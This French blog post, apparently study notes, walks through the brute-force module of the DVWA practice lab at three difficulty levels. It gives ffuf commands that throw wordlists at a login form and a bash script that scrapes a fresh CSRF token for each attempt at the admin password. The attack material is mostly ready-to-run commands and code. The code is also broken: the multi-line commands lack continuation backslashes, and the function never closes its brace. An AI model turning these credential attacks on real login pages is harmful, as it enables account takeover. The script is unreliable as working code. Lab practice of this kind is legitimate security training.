+++
title = "DVWA - Brute Force"
date = 2025-12-22
categories = ["DVWA"]
description = "Explication technique des techniques de bruteforce basiques"


[taxonomies]
tags = ["cybersécurité", "DVWA", "web"]
+++


## Easy:
- Utiliser l'outil FFUF:
(Mettre USERFUZZ et PASSFUZZ dans `request.txt` )
```bash
ffuf -request-proto http -c -r -mode clusterbomb -request request.txt 
-w /usr/share/wordlists/metasploit/unix_users.txt:USERFUZZ 
-w /usr/share/wordlists/metasploit/unix_passwords.txt:PASSFUZZ -fw 250
```


## Medium:
- Privilégier `ffuf` à `hydra` ou `burpsuite` (Trop complexe ou complet):
```bash
ffuf -c -u "http://..........." -w /usr/share/wordlists/rockyou.txt 
-b "PHPSESSID=..........;" -fs lataille
```
- remplacer le champs à brute forcer dans l'URL avec le mot clef `FUZZ`
- prendre des wordlists courtes si pas de temps

| Arguments | Explications                                                            |
| --------- | ----------------------------------------------------------------------- |
| -c        | Mode Couleur                                                            |
| -u        | préciser l'url                                                          |
| -w        | préciser la wordlist                                                    |
| -b        | préciser les cookies de sessions                                        |
| -fs       | éliminer les faux positifs en triant par la taille (size) de la réponse |


## Hard:
Si le **cookie de session** change à chaque fois:
- faire un script pour générer dynamiquement le token CSRF ( != cookie de connexion)
```bash
#!/bin/bash

BASE_URL="http://172.18.74.130:4280/vulnerabilities/brute/" 
COOKIES="PHPSESSID=d191bfc7ef1d4393a6ca0f25b0c94425; security=high" 
WORDLIST="/usr/share/wordlists/rockyou.txt"
FOUND=0

function get_csrf_token(){
	CSRF_TOKEN=$(
    curl -s "$BASE_URL" --cookie "$COOKIES" 
    | grep -oP "value='\K[a-f\d]{32}(?=')"
	)
}

function brute_force(){
	while read -r PASS
	do
		get_csrf_token
			curl -s "$BASE_URL?username=admin&password=$PASS&Login=Login&user_token=$CSRF_TOKEN" --cookie "$COOKIES" 
			        | grep -q 'Username and/or password incorrect' 2>/dev/null || FOUND=1

		if [[ "$FOUND" -eq 1 ]]
		then
			echo "Password found: $PASS"
			exit
		fi
done < "$WORDLIST"

brute_force
```
